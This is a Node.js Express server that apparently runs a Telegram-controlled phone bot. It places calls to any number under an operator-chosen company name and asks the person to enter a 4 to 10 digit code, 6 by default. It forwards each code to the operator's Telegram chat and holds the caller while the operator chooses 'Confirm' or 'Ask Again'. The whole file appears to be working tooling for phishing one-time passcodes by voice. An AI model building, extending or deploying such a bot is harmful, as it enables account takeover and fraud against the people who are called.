const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// ========= ENV =========
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const SW_PROJECT = process.env.SW_PROJECT;
const SW_TOKEN = process.env.SW_TOKEN;
const SW_SPACE = process.env.SW_SPACE; // e.g. codesncalls.signalwire.com
const SW_NUMBER = process.env.SW_NUMBER; // your SignalWire number
const BASE_URL = process.env.BASE_URL;   // e.g. https://ivr-x4e8.onrender.com

// ========= SETTINGS =========
let settings = {
  company: "Support",
  digits: 6,
  assistant: 0
};

const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Emma" },
  { name: "Orion", voice: "Polly.Brian" },
  { name: "Astra", voice: "Polly.Amy" },
  { name: "Kairo", voice: "Polly.Matthew" },
  { name: "Solara", voice: "Polly.Ivy" }
];

// ========= STATE =========
let activeCallSid = null;
let activeCaller = null;
let activeCode = null;
let callStart = null;
let callState = "idle"; // idle, waiting_code, code_received, ended
let lastCaller = null;
let panelMessageId = null;
let logs = [];
let pendingAction = null; // call_number, company, digits, voice

// ========= HELPERS =========
function authHeader() {
  return "Basic " + Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64");
}

function getAssistant() {
  return assistants[settings.assistant] || assistants[0];
}

function durationText() {
  if (!callStart) return "00:00";
  const total = Math.floor((Date.now() - callStart) / 1000);
  const mm = String(Math.floor(total / 60)).padStart(2, "0");
  const ss = String(total % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

async function tg(method, data) {
  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
  return res.json();
}

async function tgSend(text, keyboard = null) {
  const payload = { chat_id: CHAT_ID, text };
  if (keyboard) {
    payload.reply_markup = { inline_keyboard: keyboard };
  }
  return tg("sendMessage", payload);
}

async function tgAnswerCallback(id, text = "") {
  return tg("answerCallbackQuery", {
    callback_query_id: id,
    text
  });
}

function panelKeyboard() {
  return [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Ask Again", callback_data: "again" }
    ],
    [
      { text: "⛔ Hang Up", callback_data: "hangup" }
    ],
    [
      { text: "📊 Status", callback_data: "status" },
      { text: "📜 Logs", callback_data: "logs" }
    ],
    [
      { text: "📞 Start Call", callback_data: "start_call" },
      { text: "☎ Call Last", callback_data: "call_last" }
    ],
    [
      { text: "🏢 Company", callback_data: "set_company" },
      { text: "🔢 Digits", callback_data: "set_digits" }
    ],
    [
      { text: "🎙 Voice", callback_data: "set_voice" }
    ]
  ];
}

function panelText() {
  return `📞 IVR CONTROL PANEL

State: ${callState}
Caller: ${activeCaller || "none"}
Code: ${activeCode || "waiting"}
Duration: ${callState === "idle" ? "00:00" : durationText()}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${settings.assistant + 1} - ${getAssistant().name}`;
}

async function ensurePanel() {
  if (panelMessageId) return;
  const msg = await tgSend("📞 IVR CONTROL PANEL\n\nStarting...");
  if (msg && msg.result && msg.result.message_id) {
    panelMessageId = msg.result.message_id;
  }
}

async function updatePanel() {
  await ensurePanel();
  if (!panelMessageId) return;

  try {
    await tg("editMessageText", {
      chat_id: CHAT_ID,
      message_id: panelMessageId,
      text: panelText(),
      reply_markup: { inline_keyboard: panelKeyboard() }
    });
  } catch (e) {
    // ignore harmless edit errors
  }
}

function pushLog(result) {
  logs.unshift({
    caller: activeCaller || "unknown",
    code: activeCode || "none",
    result,
    time: new Date().toLocaleString()
  });
  logs = logs.slice(0, 10);
}

async function updateLiveCallTwiml(twiml) {
  if (!activeCallSid) return;

  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`;

  await fetch(url, {
    method: "POST",
    headers: {
      Authorization: authHeader(),
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({ Twiml: twiml })
  });
}

async function endLiveCall() {
  if (!activeCallSid) return;

  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`;

  await fetch(url, {
    method: "POST",
    headers: {
      Authorization: authHeader(),
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({ Status: "completed" })
  });
}

async function startOutboundCall(to) {
  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`;

  await fetch(url, {
    method: "POST",
    headers: {
      Authorization: authHeader(),
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
      From: SW_NUMBER,
      To: to,
      Url: `${BASE_URL}/ivr`
    })
  });
}

// ========= ROOT =========
app.get("/", (req, res) => {
  res.send("Server running");
});

// ========= IVR =========
app.post("/ivr", async (req, res) => {
  const digits = req.body.Digits;
  const caller = req.body.From;
  const sid = req.body.CallSid;

  // First step: ask for digits
  if (!digits) {
    activeCallSid = sid || activeCallSid;
    activeCaller = caller || activeCaller;
    activeCode = null;
    lastCaller = caller || lastCaller;
    callStart = Date.now();
    callState = "waiting_code";

    await updatePanel();

    res.type("text/xml");
    return res.send(`
<Response>
  <Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr" method="POST" timeout="8">
    <Say voice="${getAssistant().voice}">
      Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
    </Say>
  </Gather>
  <Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`);
  }

  // Digits received
  activeCallSid = sid || activeCallSid;
  activeCaller = caller || activeCaller;
  activeCode = String(digits).trim();
  lastCaller = caller || lastCaller;
  callStart = callStart || Date.now();
  callState = "code_received";

  pushLog("Code received");

  // Respond to caller first = faster
  res.type("text/xml");
  res.send(`
<Response>
  <Say voice="${getAssistant().voice}">
    Thank you. Your code has been received.
  </Say>
  <Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);

  // Telegram after response
  setTimeout(async () => {
    try {
      await tgSend(
        `📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}

Choose action:`,
        [
          [
            { text: "✔ Confirm", callback_data: "confirm" },
            { text: "🔁 Ask Again", callback_data: "again" }
          ],
          [
            { text: "⛔ Hang Up", callback_data: "hangup" }
          ]
        ]
      );

      await updatePanel();
    } catch (e) {
      console.log("Telegram error:", e);
    }
  }, 0);
});

// ========= HOLD =========
app.post("/hold", (req, res) => {
  res.type("text/xml");
  return res.send(`
<Response>
  <Pause length="10"/>
  <Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);
});

// ========= TELEGRAM =========
app.post("/telegram", async (req, res) => {
  const update = req.body;

  // ----- CALLBACK BUTTONS -----
  if (update.callback_query) {
    const action = update.callback_query.data;
    const cbId = update.callback_query.id;

    try {
      if (action === "confirm") {
        await updateLiveCallTwiml(`
<Response>
  <Say voice="${getAssistant().voice}">
    Thank you. Your code has been confirmed. Goodbye.
  </Say>
  <Hangup/>
</Response>
`);
        pushLog("Confirmed");
        callState = "ended";
        await tgSend("✔ Code confirmed and call ended.");
        activeCallSid = null;
        callStart = null;
        await updatePanel();
        await tgAnswerCallback(cbId, "Confirmed");
      }

      if (action === "again") {
        await updateLiveCallTwiml(`
<Response>
  <Say voice="${getAssistant().voice}">
    Please enter your code again.
  </Say>
  <Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`);
        callState = "waiting_code";
        activeCode = null;
        await tgSend("🔁 Asked caller to enter the code again.");
        await updatePanel();
        await tgAnswerCallback(cbId, "Asked again");
      }

      if (action === "hangup") {
        await updateLiveCallTwiml(`
<Response>
  <Say voice="${getAssistant().voice}">
    This call will now end.
  </Say>
  <Hangup/>
</Response>
`);
        pushLog("Hung up");
        callState = "ended";
        await tgSend("⛔ Call ended.");
        activeCallSid = null;
        callStart = null;
        await updatePanel();
        await tgAnswerCallback(cbId, "Hung up");
      }

      if (action === "status") {
        await tgSend(panelText());
        await tgAnswerCallback(cbId, "Status sent");
      }

      if (action === "logs") {
        if (!logs.length) {
          await tgSend("No logs yet.");
        } else {
          let msg = "📜 LAST 10 CALLS\n\n";
          logs.forEach((l, i) => {
            msg += `${i + 1}. ${l.caller}\nCode: ${l.code}\nResult: ${l.result}\nTime: ${l.time}\n\n`;
          });
          await tgSend(msg.trim());
        }
        await tgAnswerCallback(cbId, "Logs sent");
      }

      if (action === "start_call") {
        pendingAction = "call_number";
        await tgSend("📞 Send the number you want to call.\nExample:\n+12125551234");
        await tgAnswerCallback(cbId, "Send number");
      }

      if (action === "call_last") {
        if (!lastCaller) {
          await tgSend("No last caller available.");
        } else {
          await startOutboundCall(lastCaller);
          await tgSend(`☎ Calling last caller: ${lastCaller}`);
        }
        await tgAnswerCallback(cbId, "Call started");
      }

      if (action === "set_company") {
        pendingAction = "company";
        await tgSend("🏢 Send the new company name.");
        await tgAnswerCallback(cbId, "Waiting for company");
      }

      if (action === "set_digits") {
        pendingAction = "digits";
        await tgSend("🔢 Send the new digit length (4-10).");
        await tgAnswerCallback(cbId, "Waiting for digits");
      }

      if (action === "set_voice") {
        pendingAction = "voice";
        await tgSend(`🎙 Send a voice number:
1 = ${assistants[0].name}
2 = ${assistants[1].name}
3 = ${assistants[2].name}
4 = ${assistants[3].name}
5 = ${assistants[4].name}
6 = ${assistants[5].name}`);
        await tgAnswerCallback(cbId, "Waiting for voice");
      }
    } catch (e) {
      console.log("Callback error:", e);
    }

    return res.sendStatus(200);
  }

  // ----- TEXT COMMANDS -----
  if (update.message && update.message.text) {
    const text = update.message.text.trim();

    try {
      if (pendingAction === "call_number") {
        pendingAction = null;
        await startOutboundCall(text);
        await tgSend(`📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (pendingAction === "company") {
        pendingAction = null;
        settings.company = text;
        await tgSend(`🏢 Company set to: ${settings.company}`);
        await updatePanel();
        return res.sendStatus(200);
      }

      if (pendingAction === "digits") {
        pendingAction = null;
        const n = parseInt(text, 10);
        if (!Number.isInteger(n) || n < 4 || n > 10) {
          await tgSend("Invalid digit length. Use a number from 4 to 10.");
        } else {
          settings.digits = n;
          await tgSend(`🔢 Digit length set to: ${settings.digits}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (pendingAction === "voice") {
        pendingAction = null;
        const n = parseInt(text, 10);
        if (!Number.isInteger(n) || n < 1 || n > 6) {
          await tgSend("Invalid voice number. Use 1 to 6.");
        } else {
          settings.assistant = n - 1;
          await tgSend(`🎙 Assistant set to: ${getAssistant().name}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (text === "/status") {
        await tgSend(panelText());
      }

      if (text === "/logs") {
        if (!logs.length) {
          await tgSend("No logs yet.");
        } else {
          let msg = "📜 LAST 10 CALLS\n\n";
          logs.forEach((l, i) => {
            msg += `${i + 1}. ${l.caller}\nCode: ${l.code}\nResult: ${l.result}\nTime: ${l.time}\n\n`;
          });
          await tgSend(msg.trim());
        }
      }

      if (text.startsWith("/call ")) {
        const number = text.replace("/call ", "").trim();
        await startOutboundCall(number);
        await tgSend(`📞 Calling ${number}`);
      }

      if (text === "/calllast") {
        if (!lastCaller) {
          await tgSend("No last caller available.");
        } else {
          await startOutboundCall(lastCaller);
          await tgSend(`☎ Calling last caller: ${lastCaller}`);
        }
      }

      if (text.startsWith("/company ")) {
        settings.company = text.replace("/company ", "").trim();
        await tgSend(`🏢 Company set to: ${settings.company}`);
        await updatePanel();
      }

      if (text.startsWith("/digits ")) {
        const n = parseInt(text.replace("/digits ", "").trim(), 10);
        if (!Number.isInteger(n) || n < 4 || n > 10) {
          await tgSend("Invalid digit length. Use /digits 6");
        } else {
          settings.digits = n;
          await tgSend(`🔢 Digit length set to: ${settings.digits}`);
          await updatePanel();
        }
      }

      if (text.startsWith("/voice ")) {
        const n = parseInt(text.replace("/voice ", "").trim(), 10);
        if (!Number.isInteger(n) || n < 1 || n > 6) {
          await tgSend("Invalid voice number. Use /voice 1 to /voice 6");
        } else {
          settings.assistant = n - 1;
          await tgSend(`🎙 Assistant set to: ${getAssistant().name}`);
          await updatePanel();
        }
      }

      if (text === "/panel") {
        await updatePanel();
        await tgSend("Panel refreshed.");
      }
    } catch (e) {
      console.log("Message error:", e);
    }
  }

  return res.sendStatus(200);
});

// ========= LIVE PANEL TIMER =========
setInterval(() => {
  updatePanel().catch(() => {});
}, 2000);

// ========= START =========
const PORT = process.env.PORT || 3000;

app.listen(PORT, async () => {
  console.log("Server running");
  await ensurePanel();
  await updatePanel();
});
